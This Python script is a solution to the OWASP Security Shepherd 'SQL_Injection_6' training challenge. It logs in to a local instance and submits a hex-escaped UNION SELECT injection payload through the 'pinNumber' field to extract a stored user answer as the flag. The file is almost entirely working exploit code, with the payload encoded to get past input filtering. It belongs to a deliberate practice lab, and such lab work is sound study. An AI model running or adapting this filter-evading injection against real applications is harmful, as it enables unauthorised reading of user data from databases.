#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
  solution.py 
  Solution to OWAS security shepherd SQL_Injection_6 
"""
__author__ = 'mikael.kall@nighter.se'

import requests
import base64
import sys
import os
import re

# SETTINGS localhost
AUTH_URL  = 'http://localhost:8080'
AUTH_USER = ''
AUTH_PASS = ''
# Post url
POST_URL = "%s/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2" % AUTH_URL

def authenticate():

    session = requests.session()
    postData = {"login": AUTH_USER, "pwd":AUTH_PASS,"submit":"Submit"}
    session.post(AUTH_URL + '/login', postData)
    if session is None:
        return False
    else:
        return session

def get_flag():
    session = authenticate()
    rex = re.compile(r'.*<h3>(.*)</h3>.*',re.S|re.M)

    payload=r'\x27\x20UNION\x20SELECT\x20userAnswer\x20FROM\x20users\x20WHERE\x20userName\x20\x3D\x20\x27Brendan\x27\x3B\x20--\x20'

    postData = {"pinNumber":payload}
    r = session.post(POST_URL, data=postData)

    if 'Welcome back' in r.text:
        match = rex.match(r.text)
        _key = str(match.groups()[0]).replace('Welcome back','')
        print "Key: %s" % _key
    else:
        print "No injection found"

if __name__ == '__main__':
    get_flag()
